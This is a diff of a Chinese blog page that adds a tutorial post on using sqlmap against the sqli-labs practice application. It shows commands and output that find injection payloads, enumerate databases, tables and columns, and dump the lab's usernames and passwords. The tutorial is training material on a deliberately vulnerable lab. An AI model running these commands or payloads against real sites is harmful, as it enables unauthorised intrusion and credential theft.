@@ -283,6 +283,265 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/19/sqlmap使用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ahodor">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ahodor'Via">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/19/sqlmap使用/" itemprop="url">sqlmap使用指南</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-19T21:49:16+08:00">
+                2018-04-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p> 使用sqli-labs练习社区sqlmap（mysql）</p>
+<p> 漏洞源代码下载：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
+<h2 id="工具注入-sqlmap-简单演示"><a href="#工具注入-sqlmap-简单演示" class="headerlink" title="工具注入(sqlmap)简单演示"></a>工具注入(sqlmap)简单演示</h2><h3 id="简单测试-u-url"><a href="#简单测试-u-url" class="headerlink" title="简单测试 (-u url)"></a>简单测试 (-u url)</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --level 3
+
+[*] starting at 15:33:02
+
+[15:33:02] [INFO] resuming back-end DBMS &apos;mysql&apos; 
+[15:33:02] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: id=1&apos; AND 1906=1906-- PKiX
+
+Type: error-based
+Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+Payload: id=1&apos; AND (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786271,(SELECT (ELT(6992=6992,1))),0x7162766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yOBo
+
+Type: AND/OR time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind
+Payload: id=1&apos; AND SLEEP(5)-- PmIF
+
+Type: UNION query
+Title: Generic UNION query (NULL) - 5 columns
+Payload: id=-3918&apos; UNION ALL SELECT NULL,CONCAT(0x7162786271,0x58716e444643434d644b55716c6477776464456e4673725a4b65444771624356436a56647a76586b,0x7162766a71),NULL,NULL,NULL-- eMQX
+---
+[15:33:03] [INFO] the back-end DBMS is MySQL
+web server operating system: Windows
+web application technology: PHP 5.4.45, Apache 2.4.23
+back-end DBMS: MySQL &gt;= 5.0
+</code></pre><p>注：-v(–level) 3 同时显示注入的payload</p>
+<h3 id="列出数据库系统的数据库-–dbs"><a href="#列出数据库系统的数据库-–dbs" class="headerlink" title="列出数据库系统的数据库(–dbs)"></a>列出数据库系统的数据库(–dbs)</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dbs
+
+web server operating system: Windows
+web application technology: PHP 5.4.45, Apache 2.4.23
+back-end DBMS: MySQL &gt;= 5.0
+[14:51:37] [INFO] fetching database names
+[14:51:38] [INFO] the SQL query used returns 6 entries
+[14:51:39] [INFO] retrieved: information_schema
+[14:51:41] [INFO] retrieved: challenges
+[14:51:42] [INFO] retrieved: mysql
+[14:51:43] [INFO] retrieved: performance_schema
+[14:51:44] [INFO] retrieved: security
+[14:51:45] [INFO] retrieved: test
+available databases [6]:                                                                                 
+[*] challenges
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+[*] test
+</code></pre><h3 id="列出数据库表-–tables-D-数据库名，若无-D参数则显示数据库中所有表"><a href="#列出数据库表-–tables-D-数据库名，若无-D参数则显示数据库中所有表" class="headerlink" title="列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)"></a>列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --tables -D &apos;security&apos;
+web server operating system: Windows
+web application technology: PHP 5.4.45, Apache 2.4.23
+back-end DBMS: MySQL &gt;= 5.0
+[15:03:02] [INFO] fetching tables for database: &apos;security&apos;
+[15:03:03] [INFO] the SQL query used returns 4 entries
+[15:03:04] [INFO] retrieved: emails
+[15:03:05] [INFO] retrieved: referers
+[15:03:06] [INFO] retrieved: uagents
+[15:03:07] [INFO] retrieved: users
+Database: security                                                                                     
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+</code></pre><h3 id="列出数据库中的列-–column-T-表名-D-数据库名-若无-D参数则默认当前数据库"><a href="#列出数据库中的列-–column-T-表名-D-数据库名-若无-D参数则默认当前数据库" class="headerlink" title="列出数据库中的列(–column -T 表名 -D 数据库名  若无-D参数则默认当前数据库)"></a>列出数据库中的列(–column -T 表名 -D 数据库名  若无-D参数则默认当前数据库)</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --column -T &apos;users&apos; -D &apos;security&apos;
+
+web server operating system: Windows
+web application technology: PHP 5.4.45, Apache 2.4.23
+back-end DBMS: MySQL &gt;= 5.0
+[15:08:34] [INFO] fetching columns for table &apos;users&apos; in database &apos;security&apos;
+[15:08:36] [INFO] the SQL query used returns 5 entries
+[15:08:37] [INFO] retrieved: &quot;id&quot;,&quot;int(3)&quot;
+[15:08:38] [INFO] retrieved: &quot;username&quot;,&quot;varchar(20)&quot;
+[15:08:39] [INFO] retrieved: &quot;password&quot;,&quot;varchar(20)&quot;
+[15:08:40] [INFO] retrieved: &quot;first_name&quot;,&quot;varchar(8)&quot;
+[15:08:41] [INFO] retrieved: &quot;last_name&quot;,&quot;varchar(8)&quot;
+Database: security                                                                                     
+Table: users
+[5 columns]
++------------+-------------+
+| Column     | Type        |
++------------+-------------+
+| first_name | varchar(8)  |
+| id         | int(3)      |
+| last_name  | varchar(8)  |
+| password   | varchar(20) |
+| username   | varchar(20) |
++------------+-------------+
+</code></pre><h3 id="获取整某张表的信息-–dump-C-column1，column2-T-tablename-D-databasename"><a href="#获取整某张表的信息-–dump-C-column1，column2-T-tablename-D-databasename" class="headerlink" title="获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )"></a>获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )</h3><pre><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dump -C &apos;username&apos;,&apos;password&apos; -T &apos;users&apos; -D &apos;security&apos;
+
+web server operating system: Windows
+web application technology: PHP 5.4.45, Apache 2.4.23
+back-end DBMS: MySQL &gt;= 5.0
+[15:19:18] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;users&apos; in database &apos;security&apos;
+[15:19:18] [INFO] the SQL query used returns 13 entries
+[15:19:19] [INFO] retrieved: &quot;Dumb&quot;,&quot;Dumb&quot;
+[15:19:20] [INFO] retrieved: &quot;I-kill-you&quot;,&quot;Angelina&quot;
+[15:19:21] [INFO] retrieved: &quot;p@ssword&quot;,&quot;Dummy&quot;
+[15:19:22] [INFO] retrieved: &quot;crappy&quot;,&quot;secure&quot;
+[15:19:23] [INFO] retrieved: &quot;stupidity&quot;,&quot;stupid&quot;
+[15:19:24] [INFO] retrieved: &quot;genious&quot;,&quot;superman&quot;
+[15:19:25] [INFO] retrieved: &quot;mob!le&quot;,&quot;batman&quot;
+[15:19:26] [INFO] retrieved: &quot;admin&quot;,&quot;admin&quot;
+[15:19:27] [INFO] retrieved: &quot;admin1&quot;,&quot;admin1&quot;
+[15:19:29] [INFO] retrieved: &quot;admin2&quot;,&quot;admin2&quot;
+[15:19:30] [INFO] retrieved: &quot;admin3&quot;,&quot;admin3&quot;
+[15:19:31] [INFO] retrieved: &quot;dumbo&quot;,&quot;dhakkan&quot;
+[15:19:32] [INFO] retrieved: &quot;admin4&quot;,&quot;admin4&quot;
+[15:19:32] [INFO] analyzing table dump for possible password hashes                                    
+Database: security
+Table: users
+[13 entries]
++----------+------------+
+| username | password   |
++----------+------------+
+| Dumb     | Dumb       |
+| Angelina | I-kill-you |
+| Dummy    | p@ssword   |
+| secure   | crappy     |
+| stupid   | stupidity  |
+| superman | genious    |
+| batman   | mob!le     |
+| admin    | admin      |
+| admin1   | admin1     |
+| admin2   | admin2     |
+| admin3   | admin3     |
+| dhakkan  | dumbo      |
+| admin4   | admin4     |
++----------+------------+
+</code></pre>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/19/sqlmap使用/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/19/sqli-labs-Less-1-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -478,7 +737,7 @@ Your Password:root@localhost
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -491,7 +750,7 @@ Your Password:root@localhost
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
